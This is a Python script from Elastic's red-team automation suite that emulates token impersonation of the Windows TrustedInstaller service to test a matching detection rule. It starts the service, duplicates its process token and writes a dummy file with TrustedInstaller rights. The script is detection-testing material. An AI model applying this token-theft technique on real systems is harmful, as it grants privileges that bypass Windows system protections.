# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import _common


@register_code_rta(
    id="6373e944-52c8-4199-8ca4-e88fd6361b9c",
    platforms=[OSType.WINDOWS],
    endpoint_rules=[
        {
            "rule_id": "cc35ee3e-d350-4319-b7f3-ea0d991ce4d9",
            "rule_name": "Suspicious Impersonation as Trusted Installer",
        }
    ],
    siem_rules=[],
    techniques=["T1134"],
)
def startsvc_trustedinstaller():
    try:
        import win32service

        hscm = win32service.OpenSCManager(None, None, win32service.SC_MANAGER_ALL_ACCESS)
        hs = win32service.OpenService(hscm, "TrustedInstaller", win32service.SERVICE_START)
        win32service.StartService(hs, "30")
        win32service.CloseServiceHandle(hscm)
        win32service.CloseServiceHandle(hs)
        print(f"[+] - TrustedInstaller service started")
    except Exception as e:
        print(f"[x] - Failed to start TrustedInstaller service, probably already started")
        pass


def impersonate_trusted_installer():
    try:
        import win32api, win32security, win32file

        hp = win32api.OpenProcess(_common.PROCESS_QUERY_LIMITED_INFORMATION, 0, _common.getppid("TrustedInstaller.exe"))
        th = win32security.OpenProcessToken(hp, _common.TOKEN_ALL_ACCESS)
        new_tokenh = win32security.DuplicateTokenEx(
            th, 2, _common.TOKEN_ALL_ACCESS, win32security.TokenImpersonation, win32security.SECURITY_ATTRIBUTES()
        )
        win32security.ImpersonateLoggedOnUser(new_tokenh)
        print(f"[+] - Impersonated TrustedInstaller service")
        hf = win32file.CreateFile("rta_ti.txt", win32file.GENERIC_WRITE, 0, None, 2, 0, None)
        win32file.WriteFile(hf, ("AAAAAAAA").encode())
        win32file.CloseHandle(hf)
        win32api.CloseHandle(hp)
        print(f"[+] - Created File rta_ti.txt as the TrustedInstaller service")
        win32file.DeleteFile("rta_ti.txt")
        print(f"[+] - Deleted rta_ti.txt")
    except Exception as e:
        print(f"[x] - Failed TrustedInstaller Impersonation")
        pass


def main():
    _common.impersonate_system()
    startsvc_trustedinstaller()
    impersonate_trusted_installer()


